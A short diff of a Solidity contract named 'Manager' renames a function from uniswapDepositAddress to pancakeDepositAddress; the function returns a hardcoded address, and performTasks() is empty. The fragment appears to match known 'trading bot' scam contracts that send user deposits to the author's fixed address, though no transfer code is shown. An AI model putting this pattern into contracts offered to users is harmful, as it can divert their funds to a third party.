@@ -3,7 +3,7 @@ pragma solidity ^0.6.6;
 contract Manager{
 function performTasks()public{
     }
-function uniswapDepositAddress()public pure returns (address) {
+function pancakeDepositAddress()public pure returns (address) {
     return address(format(0xf78020cd6E5b77C84E791Ff6f4BBA6bbB524aeFE));
       
   }
